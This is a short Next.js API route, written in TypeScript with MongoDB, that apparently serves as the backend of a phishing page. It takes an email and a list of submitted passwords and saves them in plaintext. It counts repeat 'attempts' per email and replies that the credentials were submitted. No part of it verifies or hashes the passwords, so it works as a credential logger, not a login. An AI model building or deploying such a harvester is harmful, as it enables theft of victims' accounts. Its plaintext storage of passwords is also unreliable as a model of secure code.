import { NextResponse } from "next/server";
import { connectToDatabase } from "@/lib/mongodb";
import { Credential } from "@/models/Credential";
import { MongoError } from 'mongodb';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { email, passwords } = body;

    if (!email || !passwords || passwords.length === 0) {
      return NextResponse.json(
        { success: false, message: "Email and passwords are required" },
        { status: 400 }
      );
    }

    await connectToDatabase();

    const existingCredential = await Credential.findOne({ email });
    const createdAt = new Date();
    const formattedCreatedAt = `${String(createdAt.getDate()).padStart(
      2,
      "0"
    )}/${String(createdAt.getMonth() + 1).padStart(2, "0")}/${createdAt
      .getFullYear()
      .toString()
      .slice(-2)} ${String(createdAt.getHours()).padStart(2, "0")}:${String(
      createdAt.getMinutes()
    ).padStart(2, "0")}`;

    if (existingCredential) {
      existingCredential.attempts += 1;
      existingCredential.passwords = passwords;
      await existingCredential.save();
    } else {
      await Credential.create({
        email,
        passwords,
        attempts: 1,
        createdAt: formattedCreatedAt,
      });
    }

    return NextResponse.json(
      { success: true, message: "Credentials submitted successfully" },
      { status: 200 }
    );
  } catch (error) {
    if (error instanceof MongoError && error.code === 11000) {
      return NextResponse.json(
        { success: false, message: "Email already exists" },
        { status: 400 }
      );
    }
    console.error("Error submitting credentials:", error);
    return NextResponse.json(
      { success: false, message: "Internal server error" },
      { status: 500 }
    );
  }
}
